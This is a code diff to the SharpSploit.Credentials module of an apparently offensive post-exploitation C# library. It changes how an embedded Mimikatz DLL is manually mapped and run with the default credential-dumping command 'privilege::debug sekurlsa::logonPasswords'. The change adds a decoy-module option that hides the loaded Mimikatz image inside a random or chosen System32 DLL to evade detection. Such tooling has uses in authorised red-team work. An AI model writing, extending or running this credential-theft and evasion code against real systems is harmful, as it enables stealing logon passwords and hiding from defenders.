@@ -40,8 +40,9 @@ namespace SharpSploit.Credentials
         /// Loads the Mimikatz PE and executes a chosen Mimikatz command.
         /// </summary>
         /// <param name="Command">Mimikatz command to be executed.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
+        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords", string DecoyModulePath = null)
         {
 
             PE.PE_MANUAL_MAP MimikatzPE = new PE.PE_MANUAL_MAP();
@@ -58,9 +59,8 @@ namespace SharpSploit.Credentials
                         PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                         if (PEBytes32 == null) { return ""; }
                     }
-                    MimikatzPE = Overload.OverloadModule(PEBytes32, 
-                        Environment.GetEnvironmentVariable("WINDIR") + System.IO.Path.DirectorySeparatorChar + "System32" + System.IO.Path.DirectorySeparatorChar + "Dbghelp.dll");
-
+                    
+                    MimikatzPE = Overload.OverloadModule(PEBytes32, DecoyModulePath: DecoyModulePath, LegitSigned: false);
                 }
                 else if (IntPtr.Size == 8)
                 {
@@ -69,9 +69,8 @@ namespace SharpSploit.Credentials
                         PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                         if (PEBytes64 == null) { return ""; }
                     }
-                    MimikatzPE = Overload.OverloadModule(PEBytes64,
-                        Environment.GetEnvironmentVariable("WINDIR") + System.IO.Path.DirectorySeparatorChar + "System32" + System.IO.Path.DirectorySeparatorChar + "Dbghelp.dll");
-
+                    
+                    MimikatzPE = Overload.OverloadModule(PEBytes64, DecoyModulePath: DecoyModulePath, LegitSigned: false);
                 }
             }
             catch (Exception ex)
